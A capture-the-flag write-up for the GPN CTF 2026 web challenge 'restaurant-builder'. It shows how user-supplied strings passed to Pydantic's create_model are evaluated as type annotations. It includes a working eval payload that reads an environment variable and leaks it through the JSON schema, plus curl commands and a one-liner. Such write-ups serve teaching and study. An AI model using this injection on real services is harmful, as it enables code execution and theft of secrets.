# restaurant-builder

**Category:** Web
**Event:** GPN CTF 2026

> So you want to build your own restaurant? Well, we obviously can't just let
> you do that. Please first submit blueprints and exact descriptions for the
> building, all the furniture and every single item you plan to have in the
> restaurant.

**Flag:** `GPNCTF{anD_ONe_0R_7wo_RceS_14Ter_7H3y_bUILt_hApPilY_eVEr_AF7er}`

## TL;DR

A 40-line FastAPI app uses `pydantic.create_model(name, **description)` where
`description` is a user-supplied `Dict[str, str]`. The values become field
type **annotations**; Pydantic treats a string annotation as a
**`ForwardRef`** and `eval()`s it under `main.py`'s globals when the schema is
built. Any expression works. Wrap the answer in
`Annotated[str, Field(description=...)]` so it lands in the generated JSON
schema, point `description` at `os.environ['FLAG']`, then GET the schema and
read the flag out of `properties.x.description`.

## The vulnerable endpoint

```python
@app.post("/blueprint/{name}")
def register_blueprint(name: str, description: Dict[str,str] = Body()):
    if name in blueprints:
        raise HTTPException(409, "We already know that one. …")
    description = {k: v for k,v in description.items() if not k.startswith("__")}
    Blueprint = create_model(name, **description)
    blueprints[name] = Blueprint
    return "Blueprint successfully registered"
```

The dict-comprehension only filters **keys** starting with `__`. The
**values** are passed through untouched. In Pydantic v2,
`create_model("X", x="some_string")` treats `"some_string"` as a `ForwardRef`
for the type of field `x`. When `model_json_schema()` later wants the schema
for `x`, Pydantic calls `typing.get_type_hints` → `_eval_type` →
`eval(forward_ref, globalns, localns)`. `globalns` is `main.py`'s module
globals, which means builtins like `__import__`, `open`, and `type` are all
in scope.

Three side channels are available:

| endpoint | side channel |
| :- | :- |
| `POST /blueprint/{name}` | no eval happens here in v2 (deferred to schema build) |
| `GET /blueprint/{name}` | calls `model_json_schema()` — eval runs, result *is* the schema |
| `POST /item/{name}` | calls `model_validate_json(item, strict=True)` inside `try/except`, then raises a fixed 409 |

`POST /item/{name}` swallows everything in a bare `except`, so we use
`GET /blueprint/{name}` and push the FLAG out through the schema itself.

## The payload

We want the FLAG to land in the JSON schema. The cleanest path is
`Annotated[str, Field(description=...)]`: Pydantic carries the `Field`
metadata straight into the field's `description` property of the schema.

Forward-ref string:

```python
__import__('typing').Annotated[
    str,
    __import__('pydantic').Field(description=__import__('os').environ['FLAG'])
]
```

Wrapped as the value of an ordinary (non-dunder) field name in the
`Dict[str, str]` body:

```bash
URL=https://deep-fried-meatball-drizzled-with-toasted-rosemary-lulg.gpn24.ctf.kitctf.de

curl -sk -X POST "$URL/blueprint/exploit" \
  -H "Content-Type: application/json" \
  -d '{"x": "__import__(\"typing\").Annotated[str, __import__(\"pydantic\").Field(description=__import__(\"os\").environ[\"FLAG\"])]"}'

curl -sk "$URL/blueprint/exploit"
```

Response:

```json
{
  "properties": {
    "x": {
      "description": "GPNCTF{anD_ONe_0R_7wo_RceS_14Ter_7H3y_bUILt_hApPilY_eVEr_AF7er}",
      "title": "X",
      "type": "string"
    }
  },
  "required": ["x"],
  "title": "exploit",
  "type": "object"
}
```

## Why the obvious mitigations don't help

- **The `__` filter** is on keys only and doesn't touch values.
- **Pydantic v2 `strict=True`** on `model_validate_json` only restricts
  *runtime values*; the type annotations are still strings until eval-time.
- **No try/except** wraps `create_model` or `model_json_schema`, but even if
  there were, we don't actually need to crash — the eval result *is* the
  exfil channel.

## One-liner

```bash
curl -sk -X POST $URL/blueprint/e -H 'Content-Type: application/json' \
  -d '{"x":"__import__(\"typing\").Annotated[str, __import__(\"pydantic\").Field(description=__import__(\"os\").environ[\"FLAG\"])]"}' \
  && curl -sk $URL/blueprint/e | python3 -c 'import sys,json; print(json.load(sys.stdin)["properties"]["x"]["description"])'
```
